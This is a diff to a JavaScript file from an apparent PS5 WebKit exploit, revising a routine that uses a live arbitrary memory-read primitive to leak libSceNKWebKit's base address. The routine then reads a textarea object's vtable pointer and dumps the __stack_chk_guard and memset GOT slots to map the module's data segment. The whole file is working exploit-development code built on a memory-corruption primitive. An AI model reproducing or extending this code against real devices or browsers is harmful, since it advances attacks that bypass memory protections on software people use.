@@ -181,44 +181,69 @@ function loadOffsets() {
     });
 }
 
-// With the read primitive live, aim the carrier at the slots the profile calls
-// the memset / __stack_chk_guard GOT entries and print what is really there.
-// wkBase comes from core.js's own leak, exactly as main.js derives it.
+// With the read primitive live, work out how libSceNKWebKit is really mapped.
+// NOTE: the text segment is PF_X only (execute-only) -- reading wkBase+0 faults
+// and kills the WebProcess. Only the RW data segment (va 0x3bfc000..0x3e17018)
+// may be read.
 function dumpModuleSlots(core, carrier) {
     const HC = 0x00010AE8;
     const ctor = globalThis.__ps5NativeCtor;
     if (typeof ctor !== "number") { modsEl.textContent = "no __ps5NativeCtor"; return; }
     const base = ctor - HC;
-    let out = "ctor    = 0x" + ctor.toString(16) + "\n"
-            + "wkBase  = 0x" + base.toString(16)
-            + "  (aligned=" + (base % 0x4000 === 0) + ")\n\n";
 
-    function qwords(addr, n) {
+    function rd(addr, off) {
         carrier.aim(addr);
         const v = carrier.view;
-        const rows = [];
-        for (let i = 0; i < n; i += 8) {
-            let q = 0;
-            for (let k = 7; k >= 0; k--) q = q * 256 + v[i + k];
-            let note = "";
-            if (q > base && q < base + 0x4500000) note = "  wk+0x" + (q - base).toString(16);
-            rows.push("  +0x" + i.toString(16).padStart(3, "0")
-                      + "  0x" + q.toString(16) + note);
-        }
+        let q = 0;
+        for (let k = off + 7; k >= off; k--) q = q * 256 + v[k];
         carrier.restore();
-        return rows.join("\n");
+        return q;
+    }
+    function hex(q) { return "0x" + q.toString(16); }
+
+    let out = "ctor   = " + hex(ctor) + "\nwkBase = " + hex(base)
+            + "  (aligned=" + (base % 0x4000 === 0) + ")\n\n";
+
+    // A textarea's C++ vptr points at its vtable, which lives in the RW data
+    // segment. If segments are mapped at their file VA deltas from one base,
+    // vptr-wkBase must land in 0x3bfc000..0x3e17018. If it does not, the data
+    // segment has its own base and every `wkBase + dataRVA` in the profile is
+    // meaningless.
+    try {
+        const wrapper = carrier.textareaAddress;
+        const impl = rd(wrapper, 0x18);
+        const vptr = rd(impl, 0x00);
+        out += "textarea wrapper = " + hex(wrapper) + "\n"
+             + "  +0x18 impl      = " + hex(impl) + "\n"
+             + "  [impl] vptr     = " + hex(vptr) + "\n"
+             + "  vptr - wkBase   = " + hex(vptr - base) + "\n"
+             + "  in RW data seg (0x3bfc000..0x3e17018)? "
+             + ((vptr - base) >= 0x3bfc000 && (vptr - base) < 0x3e17018) + "\n\n";
+    } catch (e) {
+        out += "vptr probe threw: " + (e && e.message) + "\n\n";
     }
 
-    const spots = [
-        ["wk+0x00000000 (module start)", base, 0x20],
-        ["wk+0x03E14900 (__stack_chk_guard slot at +0x10)", base + 0x03E14900, 0x40],
-        ["wk+0x03E16E80 (memset slot at +0x60)", base + 0x03E16E80, 0x80]
-    ];
-    for (const sp of spots) {
-        out += sp[0] + "\n" + qwords(sp[1], sp[2]) + "\n\n";
+    function window(label, addr, n) {
+        let rows = label + "\n";
+        try {
+            carrier.aim(addr);
+            const v = carrier.view;
+            for (let i = 0; i < n; i += 8) {
+                let q = 0;
+                for (let k = i + 7; k >= i; k--) q = q * 256 + v[k];
+                let note = "";
+                if (q > base && q < base + 0x4500000) note = "   wk+0x" + (q - base).toString(16);
+                rows += "  +0x" + i.toString(16).padStart(3, "0") + "  " + hex(q) + note + "\n";
+            }
+            carrier.restore();
+        } catch (e) { rows += "  threw: " + (e && e.message) + "\n"; }
+        return rows + "\n";
     }
+    out += window("wk+0x03E14900  (__stack_chk_guard slot at +0x10)", base + 0x03E14900, 0x40);
+    out += window("wk+0x03E16EC0  (memset slot at +0x20)", base + 0x03E16EC0, 0x40);
+
     modsEl.textContent = out;
-    mark("MODPROBE-DONE", "wkBase=0x" + base.toString(16));
+    mark("MODPROBE-DONE", "wkBase=" + hex(base));
 }
 
 async function run(slots) {
